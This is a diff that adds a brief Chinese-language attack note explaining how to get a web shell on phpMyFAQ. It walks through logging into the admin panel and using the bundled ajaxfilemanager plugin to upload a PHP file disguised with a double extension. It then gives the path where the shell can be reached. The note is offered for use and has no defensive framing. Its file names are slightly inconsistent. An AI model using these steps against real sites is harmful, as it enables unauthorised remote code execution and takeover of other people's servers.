@@ -1,0 +1,11 @@
+
+///////////////////
+phpmyfaq后台拿shell。环境必须支持apache
+
+先注册个帐号。（个人观测这个比较难因为需要管理员验证个人推荐你用其他方法。）<
+有帐号的话登陆xxxx.com/phpmyfaq/admin  （普通用户这里登陆了自然没权限什么也做不了，当然如果你有管理员帐号，请直接到下一步。）
+确保后台登陆的情况下打开 xxxx.com/phpmyfaq/admin/editor/plugins/ajaxfilemanager/ajax_login.php
+然后直接上传&xxx.php.pdf
+shell路径 xxxx.com/phpmyfaq/images/xxx.php.g1f
+
+//////////////////
